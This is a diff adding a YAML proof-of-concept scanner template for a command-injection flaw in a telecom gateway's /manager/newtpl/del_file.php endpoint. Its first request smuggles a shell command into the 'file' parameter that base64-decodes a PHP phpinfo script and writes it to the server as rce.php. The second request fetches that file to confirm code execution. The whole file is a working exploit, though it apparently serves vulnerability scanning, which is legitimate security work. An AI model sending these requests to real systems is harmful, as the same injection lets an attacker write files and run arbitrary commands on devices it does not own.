@@ -1,0 +1,28 @@
+name: poc-yaml-dianxinwangguan-del_file-RCE
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /manager/newtpl/rce.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'PHP Version') && response.body.bcontains(b'phpinfo()')
+
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139721644
